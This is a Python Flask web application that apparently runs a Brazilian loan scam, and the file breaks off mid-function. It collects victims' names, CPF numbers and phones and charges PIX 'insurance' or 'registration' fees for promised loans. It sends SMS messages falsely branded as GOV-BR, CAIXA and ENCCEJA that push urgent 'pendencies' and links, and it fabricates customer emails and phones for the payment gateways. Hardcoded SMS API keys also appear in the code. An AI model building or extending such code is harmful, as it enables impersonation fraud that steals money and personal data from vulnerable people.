import os
import functools
import time
import re
import random
import string
import json
import http.client
import subprocess
import logging
import urllib.parse
import uuid
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
import secrets
import qrcode
import qrcode.constants
import base64
from io import BytesIO
import requests

from payment_gateway import get_payment_gateway
from for4payments import create_payment_api
from pagamentocomdesconto import create_payment_with_discount_api

app = Flask(__name__)

# Domínio autorizado - Permitindo todos os domínios
AUTHORIZED_DOMAIN = "*"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Permita acesso independente do referer
        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Configuração para escolher qual API SMS usar: 'SMSDEV' ou 'OWEN'
SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'OWEN')

def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using SMSDEV API
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Usar a chave de API diretamente que foi testada e funcionou
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # Verificamos se há uma URL no texto para encurtar
            url_to_shorten = None
            if "http://" in message or "https://" in message:
                # Extrai a URL da mensagem
                url_pattern = r'(https?://[^\s]+)'
                url_match = re.search(url_pattern, message)
                if url_match:
                    url_to_shorten = url_match.group(0)
                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")

            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
            }

            # Make API request
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)

            # Log the response
            app.logger.info(f"SMSDEV: Verification code sent to {formatted_phone}. Response: {response.text}")

            if response.status_code == 200:
                return True, None
            else:
                return False, f"API error: {response.text}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
        return False, str(e)

def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using Owen SMS API v2
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Get SMS API token from environment variables
        sms_token = os.environ.get('SMS_OWEN_TOKEN')
        if not sms_token:
            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
            return False, "API token not configured"

        # Format phone number (remove any non-digits and add Brazil country code)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Format as international number with Brazil code
            international_number = f"55{formatted_phone}"

            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # Prepare the curl command
            import subprocess

            curl_command = [
                'curl',
                '--location',
                'https://api.apisms.me/v2/sms/send',
                '--header', 'Content-Type: application/json',
                '--header', f'Authorization: {sms_token}',
                '--data',
                json.dumps({
                    "operator": "claro",  # claro, vivo ou tim
                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
                    "message": message,  # Mensagem SMS com limite de 160 caracteres
                    "tag": "VerificationCode",  # Tag para identificação do SMS
                    "user_reply": False,  # Não receber resposta do destinatário
                    "webhook_url": ""  # Opcional para callbacks
                })
            ]

            # Execute curl command
            app.logger.info(f"Enviando código de verificação para {international_number} usando curl")
            payload = {
                    'operator': 'claro',
                    'destination_number': international_number,
                    'message': message,
                    'tag': 'VerificationCode',
                    'user_reply': False,
                    'webhook_url': ''
                }
            app.logger.info(f"JSON payload: {json.dumps(payload)}")
                
            process = subprocess.run(curl_command, capture_output=True, text=True)

            # Log response
            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")

            if process.returncode == 0 and "error" not in process.stdout.lower():
                return True, None
            else:
                error_msg = process.stderr if process.stderr else process.stdout
                return False, f"API error: {error_msg}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
        return False, str(e)

def send_verification_code(phone_number: str) -> tuple:
    """
    Sends a verification code via the selected SMS API
    Returns a tuple of (success, code or error_message)
    """
    try:
        # Generate random 4-digit code
        verification_code = ''.join(random.choices('0123456789', k=4))

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) != 11:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido (deve conter DDD + 9 dígitos)"

        # Usar exclusivamente a API SMSDEV conforme solicitado
        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar código de verificação")
        success, error = send_verification_code_smsdev(phone_number, verification_code)

        if success:
            return True, verification_code
        else:
            return False, error

    except Exception as e:
        app.logger.error(f"Error in send_verification_code: {str(e)}")
        return False, str(e)

def send_sms_smsdev(phone_number: str, message: str) -> bool:
    """
    Send SMS using SMSDEV API
    """
    try:
        # Usar a chave de API diretamente que foi testada e funcionou
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"
        
        # Format phone number (remove any non-digits and ensure it's in the correct format)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # Verificamos se há uma URL no texto para encurtar
            url_to_shorten = None
            if "http://" in message or "https://" in message:
                # Extrai a URL da mensagem
                url_pattern = r'(https?://[^\s]+)'
                url_match = re.search(url_pattern, message)
                if url_match:
                    url_to_shorten = url_match.group(0)
                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")
            
            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
            }

            # Log detail antes do envio para depuração
            app.logger.info(f"[PROD] Enviando SMS via SMSDEV para {formatted_phone} com encurtamento de URL ativado. Payload: {params}")

            # Make API request with timeout
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params, timeout=10)
            
            # Analisar a resposta JSON se disponível
            try:
                response_data = response.json()
                app.logger.info(f"[PROD] SMSDEV: SMS enviado para {formatted_phone}. Resposta: {response_data}")
                
                # Verificar se a mensagem foi colocada na fila
                if response_data.get('situacao') == 'OK':
                    app.logger.info(f"[PROD] SMS enviado com sucesso para {formatted_phone}, ID: {response_data.get('id')}")
                    return True
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS: {response_data}")
                    return False
            except Exception as json_err:
                app.logger.error(f"[PROD] Erro ao analisar resposta JSON: {str(json_err)}")
                # Se não conseguir parsear JSON, verificar apenas o status code
                return response.status_code == 200
        else:
            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number} (formatado: {formatted_phone})")
            return False
    except Exception as e:
        app.logger.error(f"[PROD] Erro no envio de SMS via SMSDEV: {str(e)}")
        return False

def send_sms_fluxons(phone_number: str, message: str) -> bool:
    """
    Send SMS using Fluxons API
    """
    try:
        # Format phone number - remove any non-digits and add country code 55
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        # Add country code 55 if not present
        if not formatted_phone.startswith('55'):
            formatted_phone = '55' + formatted_phone
            
        app.logger.info(f"[FLUXONS] Enviando SMS para: {formatted_phone}")
        
        # API endpoint and headers
        url = "https://app.fluxons.com.br/api/sms/send"
        headers = {
            'Content-Type': 'application/json',
            'x-fluxon-api-key': 'flx_0ad9a88c7d2effe1562a010dcb41b7124d4bcad2da646f00bee81443b809382e'
        }
        
        # Request payload
        payload = {
            'phoneNumber': formatted_phone,
            'message': message
        }
        
        # Make API request
        response = requests.post(url, headers=headers, json=payload, timeout=30)
        
        app.logger.info(f"[FLUXONS] Status: {response.status_code}, Response: {response.text}")
        
        if response.status_code == 200:
            app.logger.info(f"[FLUXONS] SMS enviado com sucesso para {formatted_phone}")
            return True
        else:
            app.logger.error(f"[FLUXONS] Erro ao enviar SMS: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        app.logger.error(f"[FLUXONS] Erro ao enviar SMS: {str(e)}")
        return False

def send_sms_owen(phone_number: str, message: str) -> bool:
    """
    Send SMS using Owen SMS API v2 with curl
    """
    try:
        # Get SMS API token from environment variables
        sms_token = os.environ.get('SMS_OWEN_TOKEN')
        if not sms_token:
            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
            return False

        # Format phone number (remove any non-digits and add Brazil country code)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # Format as international number with Brazil code
            international_number = f"55{formatted_phone}"

            # Prepare and execute curl command
            import subprocess

            curl_command = [
                'curl',
                '--location',
                'https://api.apisms.me/v2/sms/send',
                '--header', 'Content-Type: application/json',
                '--header', f'Authorization: {sms_token}',
                '--data',
                json.dumps({
                    "operator": "claro",  # claro, vivo ou tim
                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
                    "message": message,  # Mensagem SMS com limite de 160 caracteres
                    "tag": "LoanApproval",  # Tag para identificação do SMS
                    "user_reply": False,  # Não receber resposta do destinatário
                    "webhook_url": ""  # Opcional para callbacks
                })
            ]

            # Execute curl command
            app.logger.info(f"Enviando SMS para {international_number} usando curl")
            payload = {
                "operator": "claro",
                "destination_number": international_number,
                "message": message,
                "tag": "LoanApproval",
                "user_reply": False,
                "webhook_url": ""
            }
            app.logger.info(f"JSON payload: {json.dumps(payload)}")
            
            process = subprocess.run(curl_command, capture_output=True, text=True)

            # Log response
            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")

            return process.returncode == 0 and "error" not in process.stdout.lower()
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False
    except Exception as e:
        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
        return False

def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
    try:
        # Get first name
        first_name = full_name.split()[0]

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) != 11:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False

        # Message template
        message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."

        # Usar exclusivamente a API SMSDEV conforme solicitado
        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS")
        return send_sms_smsdev(phone_number, message)
    except Exception as e:
        app.logger.error(f"Error in send_sms: {str(e)}")
        return False
        
def send_payment_pendency_sms(phone_number: str, first_name: str) -> bool:
    """
    Envia SMS de pendência de cadastro após pagamento aprovado na Cashtime
    """
    try:
        # Formatar a mensagem com o primeiro nome
        message = f"[URGENTE ENCCEJA]: {first_name}, sua inscricao NAO FOI CONFIRMADA. Encontramos pendencias no seu cadastro. Acesse o portal: www.acesso.inc/verificar-cpf"
        
        app.logger.info(f"[FLUXONS] Enviando SMS de pendência para {first_name} ({phone_number})")
        
        # Enviar SMS via Fluxons
        success = send_sms_fluxons(phone_number, message)
        
        if success:
            app.logger.info(f"[FLUXONS] SMS de pendência enviado com sucesso para {first_name}")
        else:
            app.logger.error(f"[FLUXONS] Falha ao enviar SMS de pendência para {first_name}")
            
        return success
        
    except Exception as e:
        app.logger.error(f"[FLUXONS] Erro ao enviar SMS de pendência: {str(e)}")
        return False

def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
    """
    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
    """
    try:
        if not phone_number:
            app.logger.error("[PROD] Número de telefone não fornecido para SMS de confirmação")
            return False
            
        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number}")
            return False
            
        # Formata CPF para exibição (XXX.XXX.XXX-XX)
        cpf_formatado = format_cpf(cpf) if cpf else ""
        
        # Criar mensagem personalizada com link para thank_you_url
        nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
        
        # Garantir que a URL está codificada corretamente
        # Se a URL ainda não estiver codificada, o API SMSDEV pode não encurtá-la completamente
        import urllib.parse
        # Verificar se a URL já foi codificada verificando se tem caracteres de escape como %20
        if '%' not in thank_you_url and (' ' in thank_you_url or '&' in thank_you_url):
            # Extrair a base da URL e os parâmetros
            if '?' in thank_you_url:
                base_url, query_part = thank_you_url.split('?', 1)
                params = {}
                for param in query_part.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                
                # Recriar a URL com parâmetros codificados
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url = f"{base_url}?{query_string}"
                app.logger.info(f"[PROD] URL recodificada para SMS: {thank_you_url}")
        
        # Mensagem mais informativa para o cliente
        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
        
        # Log detalhado para debugging
        app.logger.info(f"[PROD] Enviando SMS para {phone_number} com mensagem: '{message}'")
        
        # Fazer várias tentativas de envio para maior garantia
        max_attempts = 3
        attempt = 0
        success = False
        
        while attempt < max_attempts and not success:
            attempt += 1
            try:
                # Usar exclusivamente a API SMSDEV para confirmação de pagamento
                app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS de confirmação")
                success = send_sms_smsdev(phone_number, message)
                
                if success:
                    app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} via SMSDEV")
                    break
                else:
                    app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}/{max_attempts} via SMSDEV")
                    time.sleep(1.0)  # Aumentando o intervalo entre tentativas
            except Exception as e:
                app.logger.error(f"[PROD] Erro na tentativa {attempt} com SMSDEV: {str(e)}")
        
        return success

    except Exception as e:
        app.logger.error(f"[PROD] Erro no envio de SMS de confirmação: {str(e)}")
        return False

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"{ddd}{number}"

def generate_qr_code(pix_code: str) -> str:
    # Importar o QRCode dentro da função para garantir que a biblioteca está disponível
    import qrcode
    from qrcode import constants
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(pix_code)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    return f"data:image/png;base64,{img_str}"

@app.route('/')
@app.route('/index')
@check_referer
def index():
    # Página inicial - sem redirecionamento automático
    return render_template('index.html')

@app.route('/acesso')
@check_referer
def acesso():
    # Página de acesso com validação CAPTCHA
    return render_template('acesso.html')

@app.route('/payment')
@check_referer
def payment():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone')  # Get phone from query params
        source = request.args.get('source', 'index')
        has_discount = request.args.get('has_discount', 'false').lower() == 'true'

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}, has_discount={has_discount}")

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Use provided phone if available, otherwise generate random
        customer_phone = ''.join(filter(str.isdigit, phone)) if phone else generate_random_phone()

        # Define o valor baseado na origem e se tem desconto
        if has_discount:
            # Preço com desconto para clientes que vieram do SMS
            amount = 49.70
            app.logger.info(f"[PROD] Cliente com DESCONTO PROMOCIONAL, valor: {amount}")
            
            # Usa a API com desconto
            api = create_payment_with_discount_api()
            
            # Dados para a transação
            payment_data = {
                'nome': nome,
                'email': customer_email,
                'cpf': cpf_formatted,
                'telefone': customer_phone
            }
            
            # Cria o pagamento PIX com desconto
            pix_data = api.create_pix_payment_with_discount(payment_data)
            
        else:
            # Preço normal, sem desconto
            if source == 'insurance':
                amount = 47.60  # Valor fixo para o seguro
            elif source == 'index':
                amount = 142.83
            else:
                amount = 83.40
                
            # Inicializa a API de pagamento normal
            api = get_payment_gateway()
            gateway_name = type(api).__name__
            app.logger.info(f"[PROD] Usando gateway de pagamento: {gateway_name}")
                
            # Dados para a transação
            payment_data = {
                'name': nome,
                'email': customer_email,
                'cpf': cpf_formatted,
                'phone': customer_phone,
                'amount': amount
            }
            
            # Cria o pagamento PIX
            pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")
        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Send SMS notification if we have a valid phone number
        if phone:
            send_sms(phone, nome, amount)

        # Obter QR code e PIX code da resposta da API (adaptado para a estrutura da API NovaEra)
        # O QR code na NovaEra vem como URL para geração externa
        qr_code = pix_data.get('pix_qr_code')  # URL já formada para API externa
        pix_code = pix_data.get('pix_code')    # Código PIX para copiar e colar
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] Dados PIX recebidos da API: {pix_data}")
        
        # Garantir que temos valores válidos para exibição
        if not qr_code and pix_code:
            # Gerar QR code com biblioteca qrcode se tivermos o código PIX mas não o QR
            import qrcode
            from qrcode import constants
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(pix_code)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            buffered = BytesIO()
            img.save(buffered, format="PNG")
            qr_code = "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode()
            app.logger.info("[PROD] QR code gerado localmente a partir do código PIX")
            
        # Verificar possíveis nomes alternativos para o código PIX caso esteja faltando
        if not pix_code:
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
            app.logger.info("[PROD] Código PIX obtido de campo alternativo")
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Adicionando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=amount)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/payment-update')
@check_referer
def payment_update():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone', '') # Adicionar parâmetro phone

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente para atualização: nome={nome}, cpf={cpf}, phone={phone}")

        # Inicializa a API usando nossa factory
        api = get_payment_gateway()
        gateway_name = type(api).__name__
        app.logger.info(f"[PROD] Usando gateway de pagamento: {gateway_name}")

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Usa o telefone informado pelo usuário ou gera um se não estiver disponível
        if not phone:
            phone = generate_random_phone()
            app.logger.info(f"[PROD] Telefone não fornecido, gerando aleatório: {phone}")
        else:
            # Remover caracteres não numéricos do telefone
            phone = ''.join(filter(str.isdigit, phone))
            app.logger.info(f"[PROD] Usando telefone fornecido pelo usuário: {phone}")

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': phone,
            'amount': 83.40  # Valor fixo para atualização cadastral
        }

        app.logger.info(f"[PROD] Dados do pagamento de atualização: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Obter QR code e PIX code da resposta da API
        qr_code = pix_data.get('pix_qr_code')
        pix_code = pix_data.get('pix_code')
        
        # Garantir que temos valores válidos
        if not qr_code:
            # Algumas APIs podem usar outros nomes para o QR code
            qr_code = pix_data.get('qr_code_image') or pix_data.get('qr_code') or pix_data.get('pixQrCode') or ''
            
        if not pix_code:
            # Algumas APIs podem usar outros nomes para o código PIX
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or pix_data.get('pixCode') or ''
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment_update.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Passando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=83.40)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/check-payment-status/<transaction_id>')
@check_referer
def check_payment_status(transaction_id):
    try:
        # Obter informações do usuário da sessão se disponíveis
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        
        # Logs detalhados de entrada para depuração
        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id} para cliente: nome={nome}, cpf={cpf}, phone={phone}")
        
        # Validar dados do cliente
        if not nome or not cpf:
            app.logger.warning(f"[PROD] Dados incompletos do cliente ao verificar pagamento. nome={nome}, cpf={cpf}")
        
        if not phone:
            app.logger.warning(f"[PROD] Telefone não fornecido para envio de SMS de confirmação: {transaction_id}")
        else:
            formatted_phone = re.sub(r'\D', '', phone)
            if len(formatted_phone) != 11:
                app.logger.warning(f"[PROD] Formato de telefone inválido: {phone} (formatado: {formatted_phone})")
            else:
                app.logger.info(f"[PROD] Telefone válido para SMS: {formatted_phone}")
        
        # Verificar status na API de pagamento
        api = get_payment_gateway()
        status_data = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status_data}")
        
        # Verificar se o pagamento foi aprovado
        is_completed = status_data.get('status') == 'completed'
        is_approved = status_data.get('original_status') in ['APPROVED', 'PAID']
        
        # Construir o URL personalizado para a página de agradecimento (sempre criar, independentemente do status)
        thank_you_url = request.url_root.rstrip('/') + '/obrigado'
        
        # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
        bank = request.args.get('bank', 'Caixa Econômica Federal')
        pix_key = request.args.get('pix_key', cpf if cpf else '')
        loan_amount = request.args.get('loan_amount', '4000')
        
        if is_completed or is_approved:
            app.logger.info(f"[PROD] PAGAMENTO APROVADO: {transaction_id} - Status: {status_data.get('status')}, Original Status: {status_data.get('original_status')}")
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {
                'nome': nome if nome else '',
                'cpf': cpf if cpf else '',
                'phone': phone if phone else '',
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount,
                'utm_source': 'smsempresa',
                'utm_medium': 'sms',
                'utm_campaign': '',
                'utm_content': phone if phone else ''
            }
                
            # Construir a URL completa com parâmetros codificados corretamente para evitar problemas de encurtamento
            if params:
                # Usar urllib para codificar os parâmetros corretamente
                import urllib.parse
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url += '?' + query_string
            
            app.logger.info(f"[PROD] URL personalizado de agradecimento: {thank_you_url}")
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                app.logger.info(f"[PROD] Preparando envio de SMS para {phone}")
                
                # Fazer várias tentativas de envio direto usando SMSDEV
                max_attempts = 3
                attempt = 0
                sms_sent = False
                
                while attempt < max_attempts and not sms_sent:
                    attempt += 1
                    try:
                        app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS via SMSDEV diretamente")
                        
                        # Formatar o nome para exibição
                        nome_formatado = nome.split()[0] if nome else "Cliente"
                        
                        # Mensagem personalizada com link para thank_you_url
                        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
                        
                        # Chamar diretamente a função SMSDEV
                        sms_sent = send_sms_smsdev(phone, message)
                        
                        if sms_sent:
                            app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} diretamente via SMSDEV")
                            break
                        else:
                            app.logger.warning(f"[PROD] Falha ao enviar SMS diretamente na tentativa {attempt}/{max_attempts}")
                            time.sleep(1.5)  # Intervalo maior entre tentativas
                    except Exception as e:
                        app.logger.error(f"[PROD] Erro na tentativa {attempt} de envio direto via SMSDEV: {str(e)}")
                        time.sleep(1.0)
                
                # Tente a função especializada como backup se as tentativas diretas falharem
                if not sms_sent:
                    app.logger.warning(f"[PROD] Tentativas diretas falharam, usando função de confirmação de pagamento")
                    sms_sent = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                
                if sms_sent:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Todas as tentativas de envio de SMS falharam para {phone}")
        else:
            app.logger.info(f"[PROD] Pagamento {transaction_id} ainda não aprovado. Status: {status_data.get('status')}")
        
        # Adicionar informações extras ao status para o frontend
        status_data['phone_provided'] = bool(phone)
        # Como thank_you_url é sempre definido agora, podemos simplificar a lógica
        if is_completed or is_approved:
            status_data['thank_you_url'] = thank_you_url
        else:
            status_data['thank_you_url'] = None
        
        return jsonify(status_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/verificar-cpf')
@app.route('/verificar-cpf/<cpf>')
def verificar_cpf(cpf=None):
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    if cpf:
        # Remover qualquer formatação do CPF se houver (pontos e traços)
        cpf_limpo = re.sub(r'[^\d]', '', cpf)
        app.logger.info(f"[PROD] CPF fornecido via URL: {cpf_limpo}")
        return render_template('verificar-cpf.html', cpf_preenchido=cpf_limpo)
    return render_template('verificar-cpf.html')

@app.route('/api/create-discount-payment', methods=['POST'])
def create_discount_payment():
    try:
        # Obter os dados do usuário da requisição
        payment_data = request.get_json()
        
        if not payment_data:
            app.logger.error("[PROD] Dados de pagamento não fornecidos")
            return jsonify({"error": "Dados de pagamento não fornecidos"}), 400
        
        # Gerar chave de idempotência baseada nos dados do usuário
        import hashlib
        cpf_clean = ''.join(filter(str.isdigit, payment_data.get('cpf', '')))
        nome_clean = ''.join(c.lower() for c in payment_data.get('name', '') if c.isalnum())
        amount = 49.70  # Valor fixo para pagamento com desconto
        idempotency_key = f"{cpf_clean}_{nome_clean}_{amount}_discount"
        idempotency_hash = hashlib.md5(idempotency_key.encode()).hexdigest()
        
        # Verificar se já existe um pagamento na sessão para este usuário
        existing_payment_key = f"discount_payment_{idempotency_hash}"
        if existing_payment_key in session:
            existing_payment = session[existing_payment_key]
            app.logger.info(f"[PROD] Pagamento com desconto já existe na sessão para {payment_data.get('name', 'N/A')} ({payment_data.get('cpf', 'N/A')}): {existing_payment.get('id')}")
            return jsonify(existing_payment)
        
        # Criar uma instância da API de pagamento com desconto
        from pagamentocomdesconto import create_payment_with_discount_api
        payment_api = create_payment_with_discount_api()
        
        # Criar o pagamento PIX com desconto
        app.logger.info(f"[PROD] Criando pagamento PIX com desconto para CPF: {payment_data.get('cpf', 'N/A')}")
        result = payment_api.create_pix_payment_with_discount(payment_data)
        
        if "error" in result:
            app.logger.error(f"[PROD] Erro ao criar pagamento PIX com desconto: {result['error']}")
            return jsonify(result), 500
        
        # Armazenar na sessão com chave de idempotência
        session[existing_payment_key] = result
        app.logger.info(f"[PROD] Pagamento PIX com desconto criado e armazenado: {result.get('id')}")
        
        return jsonify(result)
    
